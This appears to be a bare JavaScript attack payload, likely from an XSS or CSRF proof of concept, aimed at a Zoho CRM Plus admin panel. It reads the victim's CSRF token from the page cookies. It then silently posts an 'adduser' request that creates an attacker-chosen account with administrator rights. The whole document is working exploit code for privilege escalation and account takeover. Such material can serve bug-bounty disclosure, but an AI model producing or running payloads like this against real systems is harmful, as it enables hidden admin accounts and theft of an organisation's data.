var csrf
var cookie=document.cookie.split(';');
for(i=0;i<cookie.length;i++){
  if((cookie[i]).startsWith(" CSRF_TOKEN")==true){
    csrf=(cookie[i]).split('=')[1];
  }
}

var params={data:"{\"email_id\":\"alltimedigbig2@gmail.com\",\"last_name\":\"digbbig2\",\"apps\":[{\"app_name\":\"support\",\"zaaid\":\"680304297\",\"is_light_user\":false,\"is_service_admin\":false,\"is_admin\":true,\"is_agent\":false,\"departments\":[{\"department_id\":\"346852000000006907\",\"chat_enabled\":false}],\"skip_no_permission\":true}],\"is_active\":true}",action:"adduser",cmcsrfparam:csrf};
$.ajax({
  url:"https://crmplus.zoho.com/zohocorpp/adminpanel.do",
  type:"POST",
  data:params
});
  
